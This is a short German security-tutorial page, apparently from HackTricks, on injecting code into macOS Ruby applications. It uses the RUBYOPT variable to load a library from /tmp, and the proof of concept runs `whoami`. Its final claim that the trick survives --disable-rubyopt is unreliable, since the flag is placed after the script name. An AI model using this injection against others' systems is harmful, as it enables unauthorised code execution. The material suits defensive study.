# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Mit dieser Umgebungsvariable ist es möglich, **neue Parameter** zu **ruby** hinzuzufügen, sobald es ausgeführt wird. Obwohl der Parameter **`-e`** nicht verwendet werden kann, um auszuführenden Ruby-Code anzugeben, ist es möglich, die Parameter **`-I`** und **`-r`** zu verwenden, um dem Suchpfad der zu ladenden Bibliotheken einen neuen Ordner hinzuzufügen und anschließend **eine zu ladende Bibliothek anzugeben**.

Erstelle die Bibliothek **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Erstelle irgendwo ein Ruby-Skript wie:
```ruby:hello.rb
puts 'Hello, World!'
```
Lassen Sie dann ein beliebiges Ruby-Skript es laden mit:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Interessante Tatsache: Es funktioniert sogar mit dem Parameter **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
